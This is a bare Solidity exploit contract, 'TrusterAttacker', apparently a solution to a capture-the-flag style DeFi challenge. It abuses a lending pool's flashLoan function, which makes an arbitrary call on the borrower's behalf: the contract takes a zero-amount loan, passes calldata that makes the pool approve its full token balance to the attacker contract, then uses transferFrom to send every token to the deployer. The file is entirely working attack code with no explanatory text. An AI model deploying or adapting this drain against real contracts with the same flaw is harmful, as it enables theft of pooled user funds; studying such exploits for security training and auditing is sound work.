// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount,address borrower,address target, bytes calldata data) external;
}

contract TrusterAttacker {

    address private attacker;
    IERC20 immutable token;
    IPool immutable pool;

    constructor(address _poolAddress, address _tokenAddress){
        pool = IPool(_poolAddress);
        token = IERC20(_tokenAddress);
        attacker = msg.sender;
    }

    function attack () external {
        uint256 balance = token.balanceOf(address(pool));

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), balance); // audit - debug
        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), attacker, balance);
    }
}
